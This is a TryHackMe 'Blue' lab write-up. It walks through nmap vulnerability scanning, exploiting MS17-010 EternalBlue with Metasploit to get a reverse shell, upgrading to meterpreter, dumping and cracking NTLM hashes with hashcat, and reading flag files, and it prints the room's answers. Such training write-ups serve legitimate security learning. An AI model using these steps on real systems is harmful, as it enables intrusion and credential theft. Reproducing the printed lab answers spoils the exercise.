---
layout: page
title: Blue
permalink: /Tutorials/TryHackMe/Blue/
---

[TryHackMe Directory](https://zacvr.github.io/Tutorials/TryHackMe/)
<br/><br/>
<br/><br/>
<br/><br/>
Flags will be **BOLD**
<br/><br/>
<br/><br/>
<br/><br/>
I used this page to help learn more Nmap commands maybe you can to!
<br/><br/>
https://www.stationx.net/nmap-cheat-sheet/
<br/><br/>
Start the machine and the connect using your Open VPN
<br/><br/>
Run "nmap *IP of Active machine*" to scan 1000 common ports
<br/><br/>
<img src="/images/TryHackMe/Blue/Blue-Port Count.PNG">
<br/><br/>
We now have the first Flag!
<br/>
**"3"** is the number of open ports under 1000
<br/><br/>
Now we need to see what the machine is vulnerable to
<br/><br/>
lets run a quick command on those 3 ports
<br/><br/>
"nmap --script vuln -p *IP of Active machine* -v"
<br/><br/>
"--script vuln" will load in scripts to scan on the target IP/Ports
<br/>
"-p 135-445" will scan ports 135-445 with those vulnerability script
<br/>
"-v" increases the verbosity *adds more words* (you can use -vv for a greater effect)
<br/><br/>
<img src="/images/TryHackMe/Blue/Blue-MS17.PNG">
<br/><br/>
Now we have our final flag of task 1!
<br/><br/>
in our command we see **"ms17-010"** it even shows the disclosure date right below the red box
<br/><br/>
<br/><br/>
**TASK 2**
<br/><br/>
We will need to use Metasploit for this portion
<br/><br/>
Lets run "msfdb init" (MetaSploit Framework DataBase Initialize)
<br/><br/>
Now lets run "msfconsole"
<br/><br/>
Once we get our ASCII art we can run the next command
<br/><br/>
"search ms17-010"
<br/><br/>
This will show several options but since weknow we have a Windows machine we can try those first
<br/><br/>
"use 2" will choose the second choice
<br/><br/>
**"exploit/windows/smb/ms17_010_eternalblue"** is the answer for the full path of the code
br/><br/>
Next up "Set RHOSTS *IP of Active machine*"
<br/><br/>
**"RHOSTS"** is the answer for the name of the value
<br/><br/>
We will also need to set the LHOSTS to tun0
<br/><br/>
"set LHOST tun0" due to using a vpn
<br/><br/>
"show options" will show all the required areas are now done
<br/><br/>
The room wants us to use "set payload windows/x64/shell/reverse_tcp" before we do the next step
<br/><br/>
all we have to do now is type "run"
<br/><br/>
No we are in! (You may need to press enter) 
<br/><br/>
**TASK 3**
<br/><br/>
Type "whoami" to see if we are now connected as "nt authority\system"
<br/><br/>
place this session in the background with "ctrl+Z"
<br/><br/>
now we need to search for shell_to_meterpreter
<br/><br/>
"search shell_to_meterpreter"
<br/><br/>
We now see the answer to a question!
<br/><br/>
"**post/multi/manage/shell_to_meterpreter**"
<br/><br/>
Now lets use what we found
<br/><br/>
"use post/multi/manage/shell_to_meterpreter"
<br/><br/>
use "show options" and we see we need to change "**Session**"
<br/><br/>
now we need to set our session
<br/><br/>
use "sessions" to find your sessions #
<br/><br/>
"set session *Session #*"
<br/><br/>
once that is done type "sessions" and it should have new information under "Information"
<br/><br/>
type "session *session #*
<br/><br/>
now it should show "meterpreter" on the current line
<br/><br/>
try using "shell" and then "whoami" to see if we are system
<br/><br/>
press "ctrl+z" to get back to meterpreter
<br/><br/>
Now lets look at processes w/ "ps"
<br/><br/>
now we need to try and migrate to one of these processes
<br/><br/>
I used "migrate 2536" to go to svchost.exe but your masy be different
<br/><br/>
**TASK 4**
<br/><br/>
Now we get to play with hashes!
<br/><br/>
"hashdump" will give us 3 hashes
<br/><br/>
"**Jon**" is the answer to 1 question of Task 4
<br/><br/>
if you google "windows password hash format" you will see they are either LM or NTLM
<br/><br/>
Lets try to crack all 3 with hashcat!
<br/><br/>
Lets save them as a document named "Bluehashes.txt"
<br/><br/>
you will need world lists for hashcat. I already had a "rockyou" list so I will use that
<br/><br/>
for hashcat we will use "sudo hashcat -a 0 -m 1000 Bluehashes.txt rockyou.wordlist --force --username --show > Hashed.txt"
<br/><br/>
-a is for the attack mode 0, -m 1000 is for the NTLM hash format, --force is for if you do not have a Intel OpenCL runtime, --username ignores the username, > Hashed.txt names a file with the output
<br/><br/>
In that new file at the end of Jons line is "**alqfna22**"
<br/><br/>
**TASK 5**
<br/><br/>
Now we need to find flags
<br/><br/>
"Flag1? This flag can be found at the system root."
<br/><br/>
"ls C:\\ will list the root
<br/><br/>
we now see "flag1.txt"
<br/><br/>
lets cat it!
<br/><br/>
"cat flag1.txt"
<br/><br/>
"**flag{access_the_machine}**"
<br/><br/>
The second flag is where passwords are stored which would be C:\windows\system32
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
<br/><br/>
[TryHackMe Directory](https://zacvr.github.io/Tutorials/TryHackMe/)
